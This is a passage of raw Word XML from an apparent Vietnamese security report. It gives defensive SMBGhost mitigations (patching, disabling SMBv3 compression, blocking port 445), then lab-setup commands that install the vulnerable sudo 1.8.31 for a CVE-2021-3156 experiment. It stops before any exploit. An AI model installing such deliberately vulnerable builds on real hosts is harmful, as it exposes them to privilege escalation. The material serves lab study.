        <w:t>Mặc dù chưa có sự ghi nhận đáng tiếc nào xảy ra về việc khai thác qua lỗ hổng SMBv3 được phát hiện bị khai thác, nhưng chúng ta nên thực hiện các biện pháp "phòng hơn chống" để giảm thiểu tối đa rủi ro nhất có thể. Hiện tại Microsoft đã tung ra bản vá cập nhật bảo mật để khắc phục tất cả thông tin về lỗ hổng này, hãy cập nhật bản vá lỗi càng sớm càng tốt.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E5891D9"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 xml:space="preserve">Vì lý do gì đó mà hệ điều hành của bạn chưa thể cập nhật được bản vá lỗi CVE- 2020-0796 này, thì bạn có thể vô hiệu hóa SMBv3 và chặn cổng 445 TCP </w:t>
      </w:r>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>trên máy tính cá nhân (Client) bằng cách sử dụng tường lửa ngay trên máy của bạn để chặn các cuộc tấn công nhằm khai thác lỗ hổng.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="16DFEEE7"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Nếu bạn sử dụng máy chủ thì khi chặn cổng này sẽ giúp tránh bị khai thác lỗ hổng cho hệ thống các máy Client khỏi các cuộc khai thác lỗ hổng này. Chặn các cổng ở toàn phạm vi sẽ giúp bảo vệ mạng khỏi các cuộc tấn công từ bên ngoài, và nó cũng là cách giúp phòng chống tốt nhất dựa trên các cuộc tấn công từ internet.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27DCC8D2" w14:textId="2A5D76AE"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Tuy nhiên, các hệ thống vẫn có thể bị tấn công từ bên trong bạn cũng nên tạo một quy tắc chặn mới để ghi đè lên quy tắc tường lửa trước đây. Sử dụng các thiết đặt được đề xuất cho bất kỳ ứng dụng khách Windows không lưu trữ chia sẻ SMB.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C10DCE8" w14:textId="47899459" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Cài đặt bản vá bảo mật của Microsoft:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF7881A"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Microsoft đã phát hành bản vá bảo mật để khắc phục lỗ hổng CVE-2020-0796. Việc cài đặt bản vá này là cách hiệu quả nhất để bảo vệ hệ thống khỏi các cuộc tấn công khai thác lỗ hổng SMBGhost.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C2CFC6C"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Cập nhật hệ điều hành Windows của bạn lên các phiên bản đã được vá, bao gồm các phiên bản Windows 10 và Windows Server. Các bản vá này có sẵn thông qua Windows Update và có thể được tải xuống trực tiếp từ trang web của Microsoft.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="14DCB72B"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i/>
          <w:iCs/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Lưu ý</w:t>
      </w:r>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>: Đảm bảo hệ thống của bạn luôn được cập nhật với các bản vá bảo mật mới nhất từ Microsoft để ngăn chặn các lỗ hổng bảo mật.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="726BB0E1" w14:textId="0808AFCB" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Vô hiệu hóa SMBv3 Compression (Tính năng nén SMBv3):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="286D93C9"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Một cách tạm thời để bảo vệ hệ thống là vô hiệu hóa tính năng nén SMBv3. Điều này sẽ ngăn chặn việc khai thác lỗ hổng thông qua tính năng nén trong SMBv3.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0ECB5D2A"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lastRenderedPageBreak/>
        <w:t>Bạn có thể vô hiệu hóa tính năng nén SMBv3 bằng cách thực hiện lệnh sau trong PowerShell (với quyền quản trị viên):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AC1D140"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Set-ItemProperty-Path "</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>HKLM:SYSTEMCurrentControlSetServicesLanmanServer</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
    </w:p>
    <w:p w14:paraId="6885588B"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Parameters" DisableCompression -Type DWORD -Value 1 -Force</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5EA2B399"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Sau khi thực hiện lệnh trên, hãy khởi động lại hệ thống để thay đổi có hiệu lực.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22D0CC07" w14:textId="3FF97E21" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Chặn cổng 445 (SMB) qua Tường lửa:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F2FDB0C"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Cổng 445 được sử dụng bởi SMB và là một cổng mở phổ biến cho các cuộc tấn công từ xa. Nếu không cần thiết phải sử dụng SMB từ Internet, hãy chặn cổng 445 (TCP/UDP) trên tường lửa của bạn.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="29F31F2C"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Chặn cổng 445 giúp ngăn chặn các cuộc tấn công từ bên ngoài (tấn công qua mạng Internet).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EFF9D38"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Bạn có thể tạo quy tắc tường lửa để chặn cổng này trên các thiết bị mạng của mình.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5F3F5D0F"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Trên Windows Firewall, bạn có thể thêm quy tắc để chặn SMB:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1CE2020F"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New-NetFirewallRule -Protocol TCP -LocalPort 445 -Action Block -DisplayName "Block SMBv3" -Enabled True</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2575CBB9" w14:textId="580B2F18" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Vô hiệu hóa SMBv3 (Nếu không cần thiết):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="50C34D05" w14:textId="4D80FD10"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Nếu bạn không cần sử dụng SMBv3, bạn có thể vô hiệu hóa hoàn toàn SMBv3 trên hệ thống của mình. Điều này sẽ ngăn chặn các cuộc tấn công khai thác lỗ hổng SMBGhost.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Để vô hiệu hóa SMBv3, sử dụng lệnh PowerShell sau:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6F6E8790"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Set-SmbServerConfiguration -EnableSMB3Protocol $false</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E539BD7"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t>Sau khi thực hiện lệnh trên, khởi động lại máy tính để thay đổi có hiệu lực.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="688E831C" w14:textId="41AF5584" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:pStyle w:val="ListParagraph"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="33"/>
        </w:numPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Kiểm tra và cập nhật phần mềm diệt virus và tường lửa:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E48BAB0" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Đảm bảo rằng phần mềm diệt virus và tường lửa của bạn được cập nhật và có khả năng phát hiện các dấu hiệu của cuộc tấn công SMBGhost.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BAE92A1" w14:textId="608B5075" w:rsidR="00A67B1C" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:spacing w:before="0" w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rFonts w:eastAsia="Calibri" w:cs="Cordia New"/>
          <w:kern w:val="0"/>
          <w:szCs w:val="26"/>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>Một số phần mềm bảo mật có thể cung cấp các tính năng bảo vệ chống lại các cuộc tấn công RCE (Remote Code Execution) và tràn bộ đệm</w:t>
      </w:r>
      <w:r w:rsidR="00FC3354" w:rsidRPr="00FC3354">
        <w:rPr>
          <w:lang w:val="en-AU" w:bidi="th-TH"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E25DA3B" w14:textId="77777777" w:rsidR="006605CE" w:rsidRDefault="006605CE" w:rsidP="006605CE"/>
    <w:p w14:paraId="0CA114D9" w14:textId="04098B84" w:rsidR="006605CE" w:rsidRDefault="009B7B6F" w:rsidP="006605CE">
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AA9854D" w14:textId="2B17E269" w:rsidR="0017260A" w:rsidRDefault="00A67B1C" w:rsidP="00FC5154">
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:bookmarkStart w:id="34" w:name="_Toc185277782"/>
      <w:r w:rsidRPr="00A67B1C">
        <w:lastRenderedPageBreak/>
        <w:t>T</w:t>
      </w:r>
      <w:r w:rsidR="00184F6A">
        <w:t>RIỂN KHAI THỰC NGHIỆM</w:t>
      </w:r>
      <w:bookmarkEnd w:id="34"/>
      <w:r w:rsidRPr="00A67B1C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="52E978B5" w14:textId="2E0D417B" w:rsidR="004E5206" w:rsidRDefault="00184F6A" w:rsidP="00E767AB">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:bookmarkStart w:id="35" w:name="_Toc185277783"/>
      <w:r w:rsidRPr="00184F6A">
        <w:t>CVE-2021-3156 (Baron Samedit)</w:t>
      </w:r>
      <w:bookmarkEnd w:id="35"/>
    </w:p>
    <w:p w14:paraId="145AD9DA" w14:textId="0D0E8B3E" w:rsidR="00F30F59" w:rsidRDefault="00184F6A" w:rsidP="002403AD">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="36" w:name="_Toc185277784"/>
      <w:r>
        <w:t>Xây dựng phòng thực nghiệm</w:t>
      </w:r>
      <w:bookmarkEnd w:id="36"/>
    </w:p>
    <w:p w14:paraId="68B3F011" w14:textId="65C3E54E" w:rsidR="00184F6A" w:rsidRPr="007B3B03" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B3B03">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve">Mô hình: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="612DF9EF" w14:textId="2B70B92D" w:rsidR="00A8252C" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="114300" distR="114300" wp14:anchorId="1E7CB211" wp14:editId="30C7EAED">
            <wp:extent cx="3796030" cy="2460625"/>
            <wp:effectExtent l="0" t="0" r="1397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3796030" cy="2460625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                    <a:ln>
                      <a:noFill/>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="60884915" w14:textId="2BC6418E" w:rsidR="00A67B1C" w:rsidRPr="00A67B1C" w:rsidRDefault="00A8252C" w:rsidP="00F440BB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
      </w:pPr>
      <w:bookmarkStart w:id="37" w:name="_Toc184042059"/>
      <w:r>
        <w:t xml:space="preserve">Hình 3. </w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="begin"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:instrText xml:space="preserve"> SEQ Hình_3. \* ARABIC </w:instrText>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:fldChar w:fldCharType="separate"/>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>1</w:t>
      </w:r>
      <w:r w:rsidR="00F2370F">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:fldChar w:fldCharType="end"/>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00184F6A">
        <w:t>Máy Ubuntu</w:t>
      </w:r>
      <w:bookmarkEnd w:id="37"/>
    </w:p>
    <w:p w14:paraId="3F347EB5" w14:textId="571294A0" w:rsidR="00184F6A" w:rsidRPr="007B3B03" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B3B03">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Cấu hình máy:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BEDCB21" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Máy ảo Ubuntu 20.4 LTS phiên bản x64.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C96A7F9" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="00184F6A">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Máy ảo này sử dụng phiên bản Sudo 1.8.31. Đảm bảo phiên bản nằm trong phạm vi dễ bị tấn công (ví dụ: 1.8.2 - 1.8.31p2 hoặc 1.9.0 - 1.9.5p1).</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34C807CF" w14:textId="1154B6C1" w:rsidR="007B3B03" w:rsidRPr="007B3B03" w:rsidRDefault="00184F6A" w:rsidP="007B3B03">
      <w:pPr>
        <w:ind w:firstLine="709"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="007B3B03">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Cài đặt phiên bản Sudo dễ bị tấn công:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5145709E" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sudo apt update</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FFE3450" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sudo apt install wget build-essential</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0629D5E1" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>wget https://www.sudo.ws/dist/sudo-1.8.31.tar.gz</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DFED31C" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>tar xvf sudo-1.8.31.tar.gz</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03F59FC2" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cd sudo-1.8.31</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="00FE8D01" w14:textId="77777777" w:rsidR="00184F6A" w:rsidRPr="00184F6A" w:rsidRDefault="00184F6A" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>./</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>configure</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40756B26" w14:textId="40740354" w:rsidR="00AA06C6" w:rsidRDefault="00184F6A" w:rsidP="007B3B03">
      <w:pPr>
        <w:pBdr>
          <w:top w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:left w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:bottom w:val="single" w:sz="4" w:space="1" w:color="auto"/>
          <w:right w:val="single" w:sz="4" w:space="4" w:color="auto"/>
        </w:pBdr>
        <w:ind w:firstLine="720"/>
      </w:pPr>
      <w:r w:rsidRPr="00184F6A">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>make &amp;&amp; sudo make install</w:t>
      </w:r>
      <w:r w:rsidR="00A8252C" w:rsidRPr="00A8252C">
        <w:rPr>
          <w:rStyle w:val="fontstyle01"/>
          <w:b w:val="0"/>
          <w:bCs w:val="0"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:bookmarkStart w:id="38" w:name="_Toc76639570"/>
    </w:p>
    <w:p w14:paraId="4C64FCA9" w14:textId="77777777" w:rsidR="007B3B03" w:rsidRDefault="007B3B03" w:rsidP="00880B83">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
        <w:rPr>
          <w:szCs w:val="26"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="39" w:name="_Toc185277785"/>
      <w:bookmarkEnd w:id="38"/>
      <w:r>
        <w:rPr>
          <w:szCs w:val="26"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Tiến hành thực nghiệm</w:t>
      </w:r>
      <w:bookmarkEnd w:id="39"/>
    </w:p>
